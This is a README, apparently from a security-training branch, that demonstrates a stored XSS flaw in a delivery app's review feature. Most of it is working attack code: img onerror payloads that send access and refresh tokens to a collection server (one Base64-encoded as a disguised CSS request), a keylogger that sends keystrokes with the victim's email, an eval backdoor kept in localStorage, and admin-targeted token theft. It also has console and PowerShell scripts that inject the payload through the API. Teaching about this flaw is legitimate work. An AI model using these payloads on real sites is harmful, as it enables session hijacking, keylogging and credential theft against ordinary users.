# Persistent (Stored) XSS Vulnerability Demo

## Overview

This branch demonstrates a **Persistent (Stored) Cross-Site Scripting (XSS)** vulnerability in the pilot review feature. Unlike reflected/DOM-based XSS that affects a single victim who clicks a malicious link, persistent XSS affects **every user who views the malicious content**. The attacker stores the malicious payload in the database through the review submission form, and it executes automatically whenever anyone views that review.

## What is Persistent XSS?

Persistent XSS (also called Stored XSS) occurs when user-supplied data is stored in a database, file, or other backend system and later displayed to users without proper sanitization. The malicious script becomes a permanent part of the application's content.

## The Vulnerability

### How It Works

1. **Attacker submits a review** with malicious HTML/JavaScript in the notes field
2. **Backend stores the payload** without sanitization in the database
3. **Victim views the review** (on pilot profile, delivery details, or review list)
4. **Frontend retrieves the review** from the API
5. **Angular displays it** using `bypassSecurityTrustHtml()`, which disables XSS protection
6. **Browser executes** the malicious JavaScript
7. **Attacker's server receives** stolen tokens/data

**Defense Failures:**

- **Server-side:** `PassThroughHtmlSanitizer` does nothing
- **Client-side:** `bypassSecurityTrustHtml()` explicitly disables Angular's XSS protection
- **CSP:** `'unsafe-inline'` allows inline event handlers, making CSP ineffective

## Attack Samples

All attacks are submitted through the review form's rich text editor. Switch to "Raw HTML" mode (toggle the Wysiwyg switch) and paste these payloads into the notes field.

### 1. Proof of Concept - Basic Alert

**Payload to paste into review notes:**

```html
<img src=x onerror=alert('pwned!')>
```

---

### 2. Complete Session Hijacking - All Tokens

**Payload to paste into review notes:**

```html
<img
  src="x"
  onerror="fetch('http://localhost:5155/images/session.png?access='+localStorage.getItem('mbc_access_token')+'&refresh='+localStorage.getItem('mbc_refresh_token'))"
/>
```

---

### 3. Stealth Token Theft - Base64 Encoded

**Payload to paste into review notes:**

```html
<img
  src="x"
  onerror="fetch('http://localhost:5155/styles/app.css?d='+btoa(localStorage.getItem('mbc_access_token')+':'+localStorage.getItem('mbc_refresh_token')))"
/>
```

**How it works:**

1. Combines both tokens with a colon separator
2. Base64 encodes the combined string to obfuscate
3. Sends as CSS request (appears more legitimate in logs)

---

### 4. Keylogger Injection

**Payload to paste into review notes:**

```html
<img
  src="x"
  onerror="document.onkeypress=function(e){let u=JSON.parse(localStorage.getItem('mbc_user'));fetch('http://localhost:5155/scripts/keys.js?email='+u.email+'&k='+e.key)}"
/>
```

**How it works:**

1. Installs a global keylogger on the page
2. Every keystroke from every viewer is sent to attacker's server
3. Includes the user's email to correlate keystrokes by victim
4. Persists as long as the page is open


---

### 5. Persistent Backdoor via localStorage

**Payload to paste into review notes:**

```html
<img
  src="x"
  onerror="localStorage.setItem('xss_backdoor','fetch(\'http://localhost:5155/images/steal.png?t=\'+localStorage.getItem(\'mbc_access_token\'))');eval(localStorage.getItem('xss_backdoor'))"
/>
```

**Simplified concept:**

```javascript
// Store malicious code in victim's localStorage
localStorage.setItem("xss_backdoor", "malicious code here");
// Execute it now
eval(localStorage.getItem("xss_backdoor"));
```

**How it works:**

1. First view: Stores malicious code in victim's localStorage AND executes it
2. If attacker can trigger execution again (another XSS, or victim revisits), backdoor runs
3. Creates persistence across page reloads

---

### 6. Targeted Admin Attack

**Payload to paste into review notes:**

```html
<img
  src="x"
  onerror="if(localStorage.getItem('mbc_user')&&JSON.parse(localStorage.getItem('mbc_user')).role==='Admin'){fetch('http://localhost:5155/images/admin.png?token='+localStorage.getItem('mbc_access_token')+'&user='+localStorage.getItem('mbc_user'))}"
/>
```

---

## Bypassing Client-Side Protections

The attacks above assume using the web form. However, a sophisticated attacker might discover that while the Angular form has some client-side validation, the server-side API has no sanitization. By calling the API directly (bypassing the web form entirely), an attacker can inject malicious content even if the UI tries to prevent it.

**This demonstrates a critical security principle:** Never rely solely on client-side validation. Always sanitize and validate on the server.

### 8. Direct API Attack via Browser Console (JavaScript)

**Context:** Attacker has an account, has completed a delivery, and can leave a review. Instead of using the form, they open browser DevTools and paste this into the console.

**Payload to paste into browser DevTools console:**

```javascript
(async function () {
  const accessToken = localStorage.getItem("mbc_access_token");
  const deliveryId = "YOUR_DELIVERY_ID_HERE";

  const maliciousPayload = `<img src=x onerror="fetch('http://localhost:5155/images/stolen.png?access='+localStorage.getItem('mbc_access_token')+'&refresh='+localStorage.getItem('mbc_refresh_token'))">`;

  const response = await fetch("http://localhost:5110/api/reviews", {
    method: "POST",
    headers: {
      Authorization: `Bearer ${accessToken}`,
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      deliveryId: deliveryId,
      rating: 5,
      notes: maliciousPayload,
    }),
  });

  const result = await response.json();
  console.log("Malicious review created:", result);
})();
```

**How to use:**

1. Sign in to the application as a customer
2. Complete a delivery (or have one completed)
3. Open browser DevTools (F12)
4. Go to the Console tab
5. Replace `YOUR_DELIVERY_ID_HERE` with an actual delivered delivery ID
6. Paste and press Enter


---

### 9. Automated Attack via PowerShell Script

**Context:** Advanced attacker wants to automate the attack, create multiple malicious reviews, or attack from outside the browser entirely.

**PowerShell script to save and run:**

```powershell
$apiUrl = "http://localhost:5110/api/reviews"
$loginUrl = "http://localhost:5110/api/auth/login"

$username = "customer@example.com"
$password = "Password123!"

$deliveryId = "YOUR_DELIVERY_ID_HERE"

$maliciousPayload = @"
<img src=x onerror="fetch('http://localhost:5155/images/stolen.png?access='+localStorage.getItem('mbc_access_token')+'&refresh='+localStorage.getItem('mbc_refresh_token'))">
"@

Write-Host "Step 1: Authenticating as $username..." -ForegroundColor Yellow

$loginBody = @{
    email = $username
    password = $password
} | ConvertTo-Json

$loginResponse = Invoke-RestMethod -Uri $loginUrl -Method Post -Body $loginBody -ContentType "application/json"

$accessToken = $loginResponse.accessToken

Write-Host "Step 2: Authenticated successfully. Token obtained." -ForegroundColor Green

Write-Host "Step 3: Injecting malicious review for delivery $deliveryId..." -ForegroundColor Yellow

$reviewBody = @{
    deliveryId = $deliveryId
    rating = 5
    notes = $maliciousPayload
} | ConvertTo-Json

$headers = @{
    "Authorization" = "Bearer $accessToken"
    "Content-Type" = "application/json"
}

try {
    $reviewResponse = Invoke-RestMethod -Uri $apiUrl -Method Post -Headers $headers -Body $reviewBody

    Write-Host "Step 4: SUCCESS! Malicious review created with ID: $($reviewResponse.id)" -ForegroundColor Green
    Write-Host "Every user who views this review will have their tokens exfiltrated." -ForegroundColor Red
    Write-Host ""
    Write-Host "Review Details:" -ForegroundColor Cyan
    Write-Host "  ID: $($reviewResponse.id)"
    Write-Host "  Delivery ID: $($reviewResponse.deliveryId)"
    Write-Host "  Rating: $($reviewResponse.rating)"
    Write-Host "  Created: $($reviewResponse.createdAt)"

} catch {
    Write-Host "Error creating review: $_" -ForegroundColor Red
    Write-Host "Status Code: $($_.Exception.Response.StatusCode.value__)"
}
```

**How to use:**

1. Save as `inject-xss.ps1`
2. Update `$deliveryId` with an actual delivered delivery ID
3. Open PowerShell terminal
4. Run: `.\inject-xss.ps1`
